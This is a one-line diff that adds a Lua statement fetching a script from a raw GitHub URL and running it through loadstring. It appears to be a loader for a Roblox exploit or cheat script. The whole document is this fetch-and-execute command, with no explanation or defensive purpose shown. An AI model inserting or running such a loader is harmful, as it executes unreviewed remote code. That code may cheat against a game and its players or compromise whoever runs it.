@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/shoot-for-eggs-spam2-nes6dkywjljhs0.lua"))()
